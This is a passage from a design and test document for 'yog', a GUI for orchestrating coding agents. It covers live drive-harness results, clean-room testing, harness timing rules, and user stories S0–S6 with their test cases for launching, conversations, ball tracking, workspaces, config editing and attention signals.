  Shift+Tab are both eaten as indentation ("inside it Tab indents", the hover's
  own words, and they are accurate). The walk cannot step off the draft in
  either direction. That was **driven, not reasoned**: swapping these two clicks
  for Tab-then-Space put a literal tab character in the draft, left Apply
  unpressed and reddened both bracket beats. Walking from the bare plane instead
  would trade a pixel for a stop count the wrong way round: a missed click hits
  blank panel, a mis-counted Space *presses* whatever the walk reached. What
  bl-b9f2 did change is that the pixel is no longer *pinned* — see the rule
  above; it is folded off the same run-time anchor as the two views.
- **NO SPELLING AT ALL — the kind that closed.** The config panes' *reads*:
  the marks pane's `Read current`, the editors' `Reload`, the login pane's
  `↻ providers + credentials`. Each was a **query** by §8.5's own taxonomy while
  `Query` carried no marks/providers/config variant, so a headless seat could
  only learn the branch by changing it. Filed and landed as **bl-0164** —
  `/marks` bare, `/config <destination>` bare, `/providers` — which retired the
  kind. **A tag is not a fact, and this one outlived its subject by six weeks**
  (bl-5cce): the runner went on pressing `Read current` at a measured point under
  the old tag, two statements above the `/marks` line that already asserted the
  same read. The click is gone; `Query::Marks` is what its own body constructs,
  so the line and the button are one implementation and the line is the seat that
  can answer. A retired kind must be swept out of the runner in the same breath,
  or the coordinate it excused survives it.

**Drivable next.** The harness now asserts S0/S1, S3/S4/S6, S5, S7 and S8 (the
four worlds above, 64 beats). What is left, and why:

- **Not driven, and the reason is the gesture itself:** S5-T6's login rows — the
  device flow ends at a real OAuth prompt, so a beat could only assert that a
  button spawns `bz`; the streamed device lines stay S0-T5's fake-substrate half.
  (The pane's `↻ providers + credentials` / per-row `Login` surface does render.)
- **Not driven, needs a fixture nobody has laid:** S7-T3's budget fold is
  *visible* in every world-C header but not *asserted* (the figure is derived RAM
  with no on-disk counterpart, and the limit line wants a `workflow.yaml`
  fixture); S4-T6 is driven only at its head (one ↓ landing on the
  attention-bearing root over a newer unmarked one) — subtree aggregation
  (`InFlight > Live > settled`, §10's `?`) over four roots in known states is
  still unlaid; §6 rule 5's *self-clear* needs a live driver racing a deposit;
  S4-T4's "a ball an agent claimed mid-conversation" case needs an agent that
  claims one.
- **Not drivable:** S9 — it waits on phase 2.
- **One known asymmetry worth keeping in view.** A negative assertion ("nothing
  was written", "no row appeared") is satisfied by a click that missed, so the
  runner brackets each one between two positives on the same coordinate wherever
  a positive exists (the §9 editors do; the activity chip's `M ⚠` count and the
  `by ball` toggle do not, and there the screenshot is still the other half).
  **What that costs, measured (bl-5cce):** S7-T2's whole gesture — pick a step,
  pick the malformed record, toggle Raw — asserts only that the ops trail did not
  grow and that yog is still up, and it held that PASS through twelve days of
  clicking blank panel *and* through driving the wrong agent entirely: `s7_descent`
  left the selection on the laid child, which has no steps at all, so the tab the
  beat opened read `(no steps yet)`. Both are fixed — the selection by a §11 `↑`,
  the points by derivation — but the lesson is the ordering: a derived coordinate
  removes the drift, and only a positive assertion removes the blindness. Where a
  surface's state is §5.3 RAM there is no positive to reach for, and the honest
  reading of such a beat is "nothing crashed", never "the gesture worked".
  The asymmetry is a property of the *pointer*, not of gestures at large: a
  boundary gesture returns a verdict, so a negative asserted after one is not
  vacuous — which is the second reason to prefer a spelling over a coordinate.

**Run logs** live in `docs/drive-logs/` — one file per real run, quoting the
wire replies verbatim and recording pass/fail per beat plus any UI observation
that becomes follow-up work.

**Where the second half stands: S0 and S1 are GREEN.** The 2026-07-26 `run`
drive passed all eight beats
against a live `gpt-5.4` wire — the goal typed, `Wire check OK.` on disk and
**painted in the transcript** with real usage folded into the header, a
`lernie message` answered inside the existing conversation, a pure restart, and
a second root agent with no re-mint. So for P0 both halves of the intro's
done-bar hold: fake-substrate tests *and* the real flow. Two prior runs are the
history worth keeping — 2026-07-24 (payoff + message red on a host tool skew,
`bz` 0.0.4 against a `lernie` linking brazen 0.0.3) and 2026-07-25 (selection
moved onto the §11 keys) — and both were red for reasons outside yog: the fix
was rebuilding the stale installed `lernie` against the `bz` beside it (bl-f69b).
**A red drive is a claim about the machine as much as about the code** — check
the tool tuple before reading a wire failure as a regression.

**And the second half now holds for S3, S4 and S6 too.** The same-day
`run-s3s4s6` drive passed all
fifteen of its beats on the same tuple: a ready ball claimed and **closed**
with the workspace's own name, the join re-deriving *delivered* across every
surface, a second conversation with no re-mint, a live Stop stirring the
attention strip and an ↓ clearing it while the state badge stayed, the by-ball
toggle proven to write nothing, a second sphere raised, and the activity chip
proven a pure read. That closes the **real-substrate** half of the done-bar for
those rungs; their fake-substrate half is still Z10/Z12's row of tests, so S3,
S4 and S6 are **not yet done** — they are half-done from the other side than
usual, which is the honest reading and the reason the two halves are named
separately.

**The ball rung is RED on main right now, and the harness is how we know**
(bl-c9f2): under the embedded balls, `bl claim` fails with `bl-delivery: no ball
on the wire: neither command.id nor a sealed bl-id trailer (§7)`, so 9 of
`run-s3s4s6`'s 15 beats and 7 of `run-s5s8`'s 26 go red on one cause — the whole
S3 ball rung, S4-T2's verbs, S3-T4's gate, and every S5/S8 beat that needs a
workspace *bound to a project*. `run` (S0/S1) and `run-s7` are 8/8 and 12/12 on
that same build, which is what localises it. It landed unseen because the
batteries' own proof was the W14 clean room driving **S0/S1 only** — the two rungs
that never touch `bl` — and `cleanroom.sh` takes any verb, so the guard against a
repeat is one argument. **A red drive is a claim about the substrate as much as
about the code**: the beats below were green on the immediately preceding main.

**And it holds for S5, S7 and S8 as of 2026-07-27** (the `run-s5s7s8`
drive): 41 further beats, all green, on the same
tuple. The gate refusing a mutating dispatch with the verdict it named, all three
§9 editors written through (a hash-guard refusal bracketed by two Applies that
land, a malformed config that `bz` itself rejects, a staged file delivered onto a
config branch by `lernie config` with yog as `$EDITOR`), both §8.4 hatches, the
nested world proven severable, the marks knob driving `bl conf` and writing
nothing of its own, the descent tree with a member selection that leaves the
child's own watermark on disk, a malformed step file that costs nothing, §6's
budget/conflicted/mail predicates, the ack converging across instances, the
uncoloured badge, the ⋯ overflow's ★ pin — and the residual ball rows the S3/S4
runner had left (new-ball convergence, assign, release, the close gate refusing
verbatim, the chip's `M ⚠`). Their fake-substrate halves are still Z11/Z13/Z14's
rows of tests, so S5, S7 and S8 are half-done from the same unusual side.
**S2 has no drive beats** (its path rung is one composer field away and worth a
beat when the runner next grows one), and S9 has none. "Drivable next" above is
the standing inventory of what the harness could reach.

**Three defects the drive found** (the runs themselves changed no Rust; the
fixes landed after): **bl-9cb0 — FIXED** — the marks pane and the composer's
ball row rendered for a workspace with *no* ball, because `focused_join` handed
back the §3.5 `UnassignedWorkspace` row whose project and ball id are empty, and
the knob's `bl conf` then failed with a missing-binary message for a no-project
fact. `focused_join` now carries `ws_balls`' own `!ball_id.is_empty()`
predicate, so a workspace no ball claims focuses no ball and both surfaces
render their empty state (S4-T3 asserts the negative; DESIGN §16.3 states it).
**bl-307f — FIXED** — a step file yog cannot parse rendered as plain bytes with
no framing, while §11 and S7-T2 both promise an "error row". Taken as the ball
recommended (the code, not the promise): `Doc` now names the three facts a
record file can be — `Json` / `Absent` / `Unparsed` — and the renderer frames
the last with `steps_view::UNPARSED` above the verbatim bytes. **bl-a942** — upstream, `lernie scan` exits 1
whenever a root agent holds pending mail; yog dispatches and surfaces it
verbatim, which is its job, so the S7-T4 beat asserts the dispatch.

### The standing done-bar: the clean room (§16.7 W14, 2026-07-26)

**From here on, "the flow works against the real one" means it works with only
`yog` and `git` on `PATH`.** That is the bar every future real-substrate claim in
this document is measured against, because it is the only run that can *fail*
when a spawn resolves a host binary — with `lernie`/`bl`/`bz` unresolvable, a
fallthrough is an `ENOENT`, not a silent success. One command re-runs it:

    make drive-cleanroom                      # DRIVE_VERB=run-s3s4s6 for another rung

which builds the release binary, preflights the host and lays the room under a
stamped scratch root. The primitive it wraps is unchanged and still direct:

    scripts/drive/cleanroom.sh target/release/yog /tmp/w14 /tmp/w14-shots run

**S0/S1 clear that bar.** The 2026-07-26 W14 clean-room drive recorded
all eight beats PASS on a live `gpt-5.4` wire in the room — the reply painted in
the transcript — with a `ps` sampler showing every substrate process image in the
chain to be the driven `yog` itself under a namespace prefix (`yog lernie
prompt`, its own successor `yog lernie advance`, and the adapter `yog bz --json
--provider codex`) and **zero** host-binary processes in the window. The ops
argv rows stay logical by design (§8.2), so that physical proof comes from `ps`
and from the seeded `world/tools/{bl,lernie,bz}` shims, each an `exec
'<the driven yog>' '<namespace>' "$@"`. Nothing reaches in from the ambient
world: the blast-radius ruling retired §16.2's brazen carve-out, so
the wire's precondition is now a **copy** — `harness.sh`'s `seed_wall` lays the
host's brazen config and credential files into the room's own
`<world>/walls/home/brazen/` with the world seed, before the launch (bl-49c6,
bl-1851).

**And the same room falsified the ball rung — since repaired.** `run-s3s4s6`
never reached a beat at W14: its fixture's first act is the gesture yog's own
empty balls section renders — `No projects yet — add one with: yog exec bl
prime` — and in the room that gesture could not work. `yog exec` layered the
world's `PATH` but never seeded the shims (only the start flow did), so before
a first Start it fell through to the operator's own `~/.local/bin/bl` on every
previous machine and died `No such file or directory` in the room (**bl-44a5**,
fixed: both hatches now converge the tools dir before handing the world out);
and with the shims present the embedded `bl` refused `prime` outright (the
§16.4 W9 ruling) with a remediation — "run a host bl by path" — that was the
very premise this bar deletes (**bl-2930**, fixed: U-balls-3 landed the
plugin-binary seam upstream, yog multiplexes `bl-delivery`/`bl-tracker`, and
the refusal is deleted — §16.4). So S3's rung, which before those fixes had
only ever been walked by the host fallthrough, now runs on the batteries:
`yog exec bl prime` founds a checkout whose plugin chain is yog at every hop,
and `run-s3s4s6` in the room is the standing proof.

**One harness rule learned the hard way (2026-07-26), and it is the whole of the
runner's timing discipline: a clock is never the thing to wait on.** Three reds
in one afternoon were the same mistake in three costumes — an 8 s sleep called
"no reply" on an agent that was four bash round trips deep; a 5 s sleep called
"no stop verb" while `lernie stop` was still reaping a *streaming* driver (an ops
row lands when its child finishes, so its latency is the child's); and, at load
average 84, one blind click at a fixed moment hit blank panel because the balls
section had not painted yet, so the whole ball rung silently never fired. A blind
click is the same fixed-sleep gamble moved from time into space. So the runner has
exactly two waiting primitives and every beat uses one of them: `await
<predicate>` polls a real surface for a verdict, and `until_landed <gesture>
<predicate>` re-fires a gesture until the substrate agrees it landed — safe
because a missed gesture is a no-op and the predicate is re-read before each
retry. **Every remaining `sleep` gates a screenshot, never a verdict.** A fourth
red taught the primitive's own boundary: `until_landed` must own **every step its
predicate depends on**, not just the last one. The S1 message beat was already
wrapped and still died five times over, because the ↓ *above* it had missed —
selection is invisible RAM (§13.1), and an unselected instance renders no
composer at all, so the click had nothing to hit. The precondition now lives
inside the retried gesture. A fifth red taught the **other** side of the same
primitive: the predicate must be MONOTONE, `>=` and never `=`. A gesture that
starts a conversation is not a no-op when it misses, so the retry ADDS to the
very quantity the predicate counts — a slow first attempt lands late, the retry
starts a second, and an equality pinned to `before + 1` is stepped straight over
and can never be true again. The beat then burns all five attempts and reports
"no new agent" against a world holding five conversations its gesture really
started, while the beat beside it passes on the evidence they left (bl-0e44).
Exactness is still assertable — outside the loop, where nothing re-fires, and
best as a count that must NOT grow.
Relatedly, a ball body rides *beside* the worktree preamble, so an agent reads it
as a job — the drive fixture's body says "run no commands and no tools" to keep a
beat about argv from becoming a beat about wire spend.

**Four more harness rules, learned the same way (2026-07-27), and every one is
about the harness rather than yog.** *(1)* **A layout is a coordinate too.** An
egui `SidePanel` grows to fit its widest label and never shrinks back, and the
balls section's `+ new ball · <project>` row carries an absolute path — so with
that section open the centre panel starts ~420px further right, which means a
coordinate can drift with *the length of the scratch directory's name*. Collapsing
the section (a persisted §4.1 override, so a landable gesture) before the beats
fixes it. **It was never only a harness lesson** (bl-ac3d, 2026-08-01): the same
row cost the operator the centre pane at 800×500, and the fix is in yog — the row
carries the project's *name*, and no panel may take more than half the window
(DESIGN §11 rules 1 and 5). *(2)* **A wheel is a coordinate in disguise.** A `scroll` verb aimed at
a *limit* still missed, because the limit moves as the panes above it grow and a
text box eats the wheel; the fix was to delete the need — world A trims its seeded
`models.yaml` to the one row it names, the Config tab then fits on one screen, and
the verb was removed again. *(3)* **Drive a stacked column bottom-up**, since each
status line pushes what is below it. *(4)* **`until_landed` must own the retype as
well as the click** — the same lesson as the ↓ above, one costume along: a draft
typed *outside* the retried gesture missed once and five Applies then re-applied
an unchanged draft, a green click with a red beat. And one substantive fixture
lesson: **a ball with no work in its worktree never reaches its close gate** — a
work branch identical to `main` has nothing to squash, so `bl close` never commits
and a failing `pre-commit` hook never runs (two closes exited 0 with the hook in
place before the fixture grew a commit).

## S0 — Stranger: first launch to first reply

Machine state: yog and nothing else (S9's retired bar — the substrates are
linked crates, §16.7); nothing configured — no world, no workspaces, no
projects, possibly no credentials.

1. Launch `yog`: the window opens to the composer, focused, with the wordmark
   and a one-line invitation. Greyed above the box: `will be named <name>`
   (DESIGN §3.3 as amended at bl-df65 and bl-6920 — the name is the
   **conversation's own**, minted; the workspace never enters the prompt, and
   nothing enters the goal) — the name prediction,
   pre-minted as a pure read (§3.3; **nothing at
   all spawns before Enter** — the last read-only spawns, W5's capability
   probes, died with the gate at §16.7 W13). No wizard, no empty dead end, no
   setup screen.
2. Type a goal, hit Enter — **one box, one Enter**. On this one explicit
   action (I7) the world materializes: the `world/tools/bl` agent-tool shim is
   written (§16.7 W9 — so the agent's `bl` is yog's own, first on its `PATH`),
   `lernie prime` seeds the nested home
   (skipped forever after — the seeded world is the general path with the
   seed present, §3.4/W3),
   `lernie new <root>/home` creates the workspace under the fixed default
   name (DESIGN §3.1 — no picker, no mint), the
   previewed conversation name mints (re-derived at fire; the fired mint is
   the truth, §3.3), and the goal — the payload **exactly as typed**, nothing
   prepended (bl-6920; identity rides `--name`, lernie states the stored fact
   in its assembled context) — fires as a detached
   `lernie prompt` with `YOG_NAME=home`, cwd `~`.
3. The start renders in flight (busy indicator per step), then **the reply
   streams into the focused view** — the root appears within a watch tick
   and its streaming tail paints as it grows (§5.1 #10). That is the Codex
   bar: text in, text out, nothing between.
4. Any step failure is a **rendered fact**: the ops line (argv, cwd, exit,
   stderr — §4.2 as amended) expands in the ops pane, and the originating
   surface shows ichor red with argv + stderr tail. That holds for a *driver*
   that dies too, not only a step yog itself ran: the conversation renders the
   §7.3 **no-response wound** — "driver produced no response" in ichor beside
   the step and bannered on the conversation — instead of a `0 attempts · 0 tok`
   row that reads as a quiet step, while the driver's own stderr rides its
   per-spawn sink into the ops trail (§8.1/§13.3). The typed goal survives
   in the composer (the draft is RAM until *sent* — a failed start has not
   sent it). A substrate failure aborts *before* any `bl` mutation (§8.1
   order) — no half-committed state, ever.
5. If the model call needs credentials, the failure surfaces as derived
   agent state (§13.3 — the detached driver has no captured stderr): the
   auth-failed step renders with a **Login** affordance one click away,
   which runs `bz --login --provider <row>` streamed-piped (§8.3 as
   amended) and paints the device code/URL lines live. Credentials stay
   bz's; yog renders, never stores.

Burden check: the user never sees "world", "ball", "worktree", "claim", or a
name picker. One box, one Enter. The name prediction is one grey line.

Tests:
- **S0-T1 bootstrap-bare-start**: empty world, submit → argv sequence
  `lernie prime`, `lernie new <names-root>/home`, detached `lernie prompt`
  carrying `--name <minted>` + the typed text **verbatim** (bl-6920: no
  identity line in the payload), env
  `YOG_NAME=home`, cwd `~`; the pre-submit view-model already predicted the
  minted name (`will be named <a-b>`); ops trail complete.
- **S0-T2 seeded-skip**: seeded world (marker present) → no `prime` spawn.
- **S0-T3 seed-failure-surfaces**: fake `lernie prime` exits 2 → **no `bl`
  spawn recorded**; the error carries argv + stderr; the ops row holds
  stderr; the failure view-model renders argv + stderr tail; the draft
  remains.
- **S0-T5 login-stream**: fake `bz --login` prints a device code → the
  streamed-piped runner's view-model carries the lines verbatim; outcome
  line lands in ops at exit.
- **S0-T6 login-detection**: fixture workspace with an auth-failed step on
  disk → the step's view-model carries the Login affordance.

## S1 — Returner: the conversation continues

1. Relaunch yog: the workspace, its agents, and every transcript render from
   disk (I1 — restart is re-read; nothing to restore, nothing to resume).
   Quitting was always safe: drivers are setsid-detached (§7.3) — closing
   the window never kills a running agent, and the next launch re-derives
   them mid-flight. A second instance alongside converges identically (I0).
2. Enter in the composer → a new root in the focused workspace. Re-opening
   is the same gesture as opening (§3.4) — no resume concept.
3. Select an agent and type → `lernie message` (the resume gesture, §8.2).
   Stop (± children) and Scan work per §8.2. (Platform caveat, §10: `lernie
   stop` is /proc-based — on macOS the Stop failure renders verbatim; the
   fix is upstream lernie's, tracked there.)
4. The streaming tail keeps painting for any in-flight agent (S0 step 3's
   surface, same derivation).

Burden check: identical gesture set to S0; the second launch adds zero steps.

Tests:
- **S1-T1 prompt-into-existing**: focused workspace, submit → `lernie
  prompt` only (no mint, no `new`, no `prime`).
- **S1-T2 restart-equivalence**: two AppModels over the same disk derive
  identical view-models — workspace tabs and per-workspace trees (I0).
- **S1-T3 agent-verbs**: message/stop/scan argv per §8.2, outcomes in ops.
- **S1-T4 reply-streams**: fixture workspace with an open `response.json` →
  the transcript view-model carries the live tail, visually distinct.

## S2 — Director: point the conversation at a directory

1. The composer grows one optional affordance: a work target (a directory).
   Submitting with a path appends the §3.3 target preamble verbatim and sets
   driver cwd to the path. The directory need not be a bl project (§3.4).

Burden check: the affordance is ignorable; empty target = S0/S1 exactly.

Tests:
- **S2-T1 path-rung**: submit with dir → goal carries the target preamble,
  spawn cwd = dir, no `bl` spawns.

## S3 — Tracker: work rides a ball

Projects enter yog's world by being primed *in the world* — in the world's own
balls space, whose board is the shared store branch an agent raised on a ball is
pointed at (§16.3). v1 keeps `bl prime` out of the UI (§8.3): the paved interim
is `yog exec bl prime` in the repo — and the left panel's empty balls
section renders exactly that hint (owned by Z4; tested by S3-T5).

1. A ready ball's ▶ Start claims it `--as <workspace-name>` (§3.2) — *after*
   the workspace exists (§8.1 order) — and the composer prefills ball title,
   body verbatim, and the worktree preamble; driver cwd = the work worktree.
2. A new ball from the composer is `bl create` then the existing-ball path —
   the new→existing transition is the convergence (§8.1).
3. A ball already claimed by a local workspace name re-plans as a prompt
   into that workspace — resume, never a second mint (§8.1).
4. The §3.5 join table renders every row state; `bl close` surfaces gate
   failures verbatim.
5. Shipping is one verb: Close stamps `bl close <id> --as <the ball's bound
   workspace name>` (§8.2's claimant rider — the claimant delivers its own
   ball; the operator's `$USER` never appears). The ball file is then gone, so
   the row re-derives as **delivered** from the closed listing's claimant
   (§3.4) — grouped under the same workspace, nothing stored to remember it.

Burden check: with zero projects in the world, no ball UI exists at all —
the §3.5 "unassigned workspace" row is the general case (no ball column).

Tests:
- **S3-T1 ball-rung**: ready ball → `bl claim <id> --as <name>` after
  `lernie new`, goal carries title/body/worktree preamble, cwd = worktree.
- **S3-T2 new-ball-converges**: create → re-planned as existing; one claim.
- **S3-T3 resume-not-remint**: ball claimed by local name → prompt into
  that workspace; no mint, no claim.
- **S3-T4 close-gate-verbatim**: fake `bl close` fails its gate → stderr
  verbatim in ops + view-model.
- **S3-T5 empty-project-hint**: zero projects in the world → the balls-
  section view-model carries the `yog exec bl prime` hint.
- **S3-T6 abort-before-claim**: ball rung with a fake `lernie prime` (or
  `lernie new`) failing → **no `bl create`/`bl claim` recorded** — the §8.1
  load-bearing order proven on the rung that has a `bl` mutation to abort
  (S0-T3's no-`bl` assertion is vacuous on the bare rung).
- **S3-T7 close-stamps-and-delivers** (`stories_s3_t7.rs`): Close on a bound ball → `bl close <id>
  --as <bound workspace name>`, cwd = the project; with the ball then absent
  from the live set, the join re-derives it delivered under that same
  workspace and the conversation's badge turns ash (§3.5).

## S4 — Organizer: spheres, corrals, and the board

1. New workspace (the deliberate sphere-wall verb, §3.4/§11) takes a typed,
   validated name (DESIGN §3.1) — the first time the user ever names one.
2. Assign / move / release balls (§8.2) with enablement from the join state;
   bound balls render in the focused workspace's balls section (§11 — the
   full per-project ball views return in the ball-views wave).
3. Claimed-elsewhere renders the claimant verbatim; delivered balls group
   under their claimant on demand (§3.4). Workspace retirement is lernie's
   retention (30-day default, §3.4) — yog deletes nothing and grows no
   delete verb; clutter ages out where the data lives.
4. **The conversation list is the board.** With many roots in flight, each row
   carries its subtree's aggregated state, its age, and — when the
   conversation was started from a ball — that ball's badge, coloured by the
   ball's own §3.5 row state: bound green, delivered ash, blocked or
   claimed-elsewhere brazen, orphaned ichor. **Sort is recency alone** —
   last action of any kind, descending, then root id for a deterministic
   tail. This row once read "Sort is §6's: attention > running > recency";
   bl-cad5 amended §11 because pinning a flagged-but-stale row above one that
   moved a second ago is exactly what read as broken. Attention and liveness
   are badges here, not ranks. The old ranking survives on the *other* roster
   — §6's jump order (`attention::roster`), which S6-T4 covers — and the real
   drive beat that still asserts the old head is stale, not a regression
   (bl-2d45, the 2026-08-07 re-baseline log RED 4).
5. **The badge is honest about what it cannot know** (§3.2's two altitudes).
   A conversation started bare or by path shows *no* badge; a stamped id this
   machine's join does not know shows the id **uncoloured** — the stamp is
   truth, the colour is the join's when it has one. And a ball an agent
   claimed mid-conversation shows in the *workspace's* bound-ball rows only:
   no fact records which conversation picked it up, so no badge is invented.
6. **One toggle re-organizes the same rows**: `by ball` partitions the sorted
   list so each stamped ball heads its conversations, the stamp-less ones
   trailing in a single unassociated group; `recent` is the flat default. It
   is a re-ordering of rows already on screen — no row appears, disappears, or
   changes meaning — and the toggle itself is viewport ephemera (§13.1),
   stored nowhere.
7. **The tab strip is the sphere wall**: one tab per named workspace, pinned
   first then name order, each badged with its own attention count; foreign
   and replay workspaces live in the ⋯ overflow (real, but not regimes) and
   the overflow button carries their aggregate. Pinning hoists one out.
8. **Ctrl+F finds it, wherever it is** (§8.5, bl-3c28). Once there are more
   spheres than fit on a strip, remembering *where* something was stops being
   free — so one query spans the world: ball ids, titles and bodies (closed
   ones too), workspace and conversation names, conversation goals, and every
   committed transcript entry. Results are things you can already open — a
   ball, a workspace, a conversation — one row each, ranked id-before-title-
   before-body, and clicking one is the same selection clicking it in the
   roster would make. Nothing is indexed: the files are read as they are now,
   so a hit is a statement about the bytes on disk and there is no store to go
   stale. Ctrl+F is not a new surface — it puts the composer on a `/search `
   line, which is the same gesture a teleoperator types and a deposit spells
   `{"op":"search"}`. A search naming nothing clears the last one. Sources it
   could not read are listed beside the results, so a broken corner of the
   world never quietly shrinks the answer.

Burden check: S0–S3 never named a workspace explicitly; nothing here changes
their path.
A one-conversation workspace renders identically under both orderings, and a
world with no balls renders no badge column at all.

Tests:
- **S4-T1 new-workspace-verb**: typed name validated (shape, reserved
  `unknown`, leaf collision refused — DESIGN §3.1) + `lernie new`.
- **S4-T2 assign-move-release**: argv per §8.2; enablement predicates refuse
  what balls would refuse.
- **S4-T3 join-rows**: one fixture per §3.5 row state; the balls section
  groups bound balls under their claimant workspace.
- **S4-T4 conversation-badges** (`stories_s4_t4.rs`): four conversations in one workspace — goal
  stamped with a bound ball, stamped with a delivered ball, stamped with an id
  the join does not know, unstamped → badge hues green / ash / **uncoloured
  id** / **none**; plus a ball claimed by the workspace with no stamp anywhere,
  asserted present in the workspace's bound rows and absent from every
  conversation row (§3.2's honest limit, never a fabricated row).
- **S4-T5 group-partition** (`stories_s4_t5.rs`): grouping is a pure stable partition of the sorted
  rows — group order = first appearance, within-group order preserved, the
  unassociated group emitted last and only when non-empty; flattening the
  groups returns the input rows unchanged.
- **S4-T6 board-order** (`stories_s4_t6.rs`): subtree aggregation (InFlight >
  Live > the root's settled state, with the §10 "?" suffix) and the §11
  recency sort, over one fixture carrying an attention-flagged idle root, a
  wounded root, and settled roots of different ages. The sort half is
  *amended* (bl-cad5, above): the assertion is that the attention-flagged row
  is **not** hoisted, which is the regression guard for the fix.
- **S4-T7 tab-strip** (`stories_s4_t7.rs`): pinned tabs hoist in pin order ahead of name order,
  each tab's badge is its own workspace's rollup, foreign and replay
  workspaces fall to the overflow, and the overflow button carries their
  aggregate attention.
- **S4-T8 search-parity** (`tests/integration/boundary_search.rs`, with the
  derivation's own tables in `src/search/tests.rs`): one world of balls (live
  and closed), a workspace, and a conversation with a goal and a transcript on
  disk — the typed line, the JSON envelope and the in-RAM variant produce the
  *same gesture*, and the deposited search's reply file is byte-identical to
  the in-process answer. Beside it: one hit per address however many times a
  transcript matches; the rank order over the three tiers; the cap; an
  unreadable goal named while the rest of the world still answers; a
  superseded run abandoning before it reads the conversations; and an empty
  search answering empty at every seat rather than refusing.

## S5 — Operator: the tools and their configuration

1. Login pane: a Login button on every provider row `bz --login` can serve and
   on **no other** (§8.3 rule 4) — a row it cannot serve carries, where the
   button would be, the reason there is none ("keyless — nothing to log in",
   "api-key provider — set the key in Config"), and every row states its
   credential fact in words per point 4. The button streams `bz --login`'s
   device code and URL live, with the exact-command fallback if the
   piped flow exits non-zero. There is **no tool verdict and no remediation
   column** — the pane's phase-1 half (per-tool capability rows against the
   normative driven-verb list) died with the gate at §16.7 W13, because a
   lockfile-pinned crate has no install story to show (§16.4).
2. Config editing per §9, three surfaces, one gesture: brazen's `config.toml`
   as raw TOML, lernie's global `models.yaml`/`workflows/*` as raw text, and a
   workspace's config branches — the last written by `lernie config` driven
   with yog itself as `$EDITOR` (§9.3), because that verb is the only lawful
   writer of `config/*`.
3. **One discipline for all three**: load → RAM buffer → Apply = stage →
   validate where a validator exists → hash-guard → atomic rename. A malformed
   brazen config cannot land — `bz` itself rejects the staged file and the
   draft survives in the box. A file changed underneath (the other instance,
   or vi) refuses the Apply and says so rather than overwriting.
4. Credentials are never yog's: presence renders, contents never do, and the
   only write path is bz's own login. **Renders means says so in words** — every
   provider row, in the config pane and the Login pane alike, reads "signed in"
   / "not signed in" / "no credential needed" / "no credential stored" off one
   derivation (bl-402f). Nothing is left to a luminance the operator has to
   interpret, and "signed in" is claimed only where a login could have earned it.

Burden check: nothing here sits on the S0 path — the Login pane and Config are
left-panel entries the stranger never opens, and no machine renders a verdict or
a remediation string any more.

Tests:
- **S5-T3 brazen-validate-rejects** (`stories_s5_t3.rs`): a staged buffer whose `bz --config <temp>
  --dump-config` exits non-zero → the destination file is byte-identical
  afterwards, no temp survives, stderr renders, the draft is kept.
- **S5-T4 hash-guard** (`stories_s5_t4.rs`): the file changes on disk after
  load → Apply refuses and names the drift; after a reload the same Apply
  lands. Asserted once per editor that **has** the guard — brazen and
  lernie-global, which share `config_edit::pipeline`'s snapshot commit: one
  discipline, **two** doors. The row once said three. The **config branch has
  no hash guard and must not grow one**: yog never writes `config/*` at all —
  `lernie config` is that tree's only lawful writer (§9.3) and owns its own
  concurrency — so a guard on yog's side would be yog claiming authority over
  a file it does not own. Its must-not-exist case (creating a file that
  appeared underneath you) is the same guard with an empty `loaded`, not a
  fourth rule.
- **S5-T5 config-branch-shim**: `lernie config <ws> <name>` is spawned with
  `EDITOR=<yog> --editor-apply` and `YOG_EDIT_SRC=<stage>`; the shim copies
  **only** the drafted files (a `descriptions/` file already in the checkout
  is untouched) and an empty diff surfaces verbatim — "no change" is lernie's
  own sentence riding back through the outcome, not a judgement yog derives.
  The staging dir is **not** gone at exit, and deliberately: this row used to
  say it was. `drive` returns the outcome and leaves the staged bytes alone (a
  draft the operator may still be looking at); `sweep_staging` reclaims a
  directory untouched for 24 h at the next startup (§5.2). Deleting in the
  same breath would race lernie's own read of the checkout it was just handed.
  (`tests/integration/editor_roundtrip.rs` is this test's seed and holds the
  copy half end-to-end through the real `yog` binary as `$EDITOR`;
  `stories_s5_t5.rs` holds the spawn contract, the ride-back and the staging
  lifetime.)
- **S5-T6 login-rows** (`stories_s5_t6.rs`): provider rows derive from the §5.1 #20/#21 config
  reads; the streamed runner's view-model carries the device lines verbatim
  (shared with S0-T5) and a non-zero exit falls back to the exact command.

## S6 — Triager: what needs you, and what went wrong

Machine state: several workspaces, many conversations, some finished, one
dead.

1. The attention strip answers "does anything need me?" with no click: totals
   per signal kind across every workspace, each tab badged with its own count,
   and one jump-to-next control that walks them in derived order.
2. Attention is a predicate over disk (§6), never a stored flag: unacked
   notify, stopped-without-abandoned, budget, conflicted — and pending mail
   nobody is driving. That last one is deliberately **not** silenceable: a
   stall you can dismiss is a stall you will miss.
3. **Acknowledging is focusing.** Landing on a conversation records the
   current evidence oids as seen. The acknowledgement *converges* — the second
   instance stops flagging it too — while each instance's own focus stays its
   own (§13.1). The mark is lernie's; the acknowledgement is yog's.
4. **Acknowledging clears the signal, not the fact.** A dead conversation goes
   quiet in the strip and keeps its state badge, and an auth-shaped death
   keeps its inline Login one click away.
5. The other half is the activity accessory: one chip, `activity · N ops ·
   M ⚠ · K drift` (ichor when either count is non-zero), expanding to the ops
   tail; any row expands to argv, cwd, exit and stderr verbatim — including
   actions that never spawned. A trail that hides *why* is not a trail. yog's
   own plumbing lives there and never between conversation messages — and since
   bl-49f4 that includes yog accusing *itself*: `K` counts the sweeps' drift
   findings (a change the watcher never announced, DESIGN §7.2), attributed to
   root and kind in the expanded row.

Burden check: at S0 the strip reads "nothing stirs" and the chip reads
`activity · 0 ops`. The rung adds no gesture — it adds meaning to two surfaces
already on screen.

Tests:
- **S6-T1 attention-predicates** (`stories_s6_t1.rs`): one fixture per §6
  rule — **six of them, not five**: rule 6 (`held`, a tool invocation parked
  at the capability boundary, §8.6) landed with S15–S17. Each is asserted
  true, then false once the matching watermark is written — except rules 5 and
  6, which stay true across *every* watermark because neither carries
  watermark evidence at all (`attention::evidence` names only the four
  oid-bearing marks). Rule 5 self-clears when a driver takes the executor
  lock, which the test stages by holding the agent's inbox directory open —
  the very fd the §2.11 probe scans `/proc` for; rule 6 clears on an answer,
  never on an acknowledgement. Rule 2 carries **two** fixtures since bl-2194 widened it to
  rest: the wounded rest (a failed latest step → `Stopped`) and the **clean**
  one (a complete `response.json` → `Quiescent`). Both stir, both clear on the
  same tip watermark, and only the state badge tells them apart — a running
  agent is the one that is not in the queue.
- **S6-T2 ack-converges** (`stories_s6_t2.rs`): two AppModels over one `ui.json`; acknowledging in
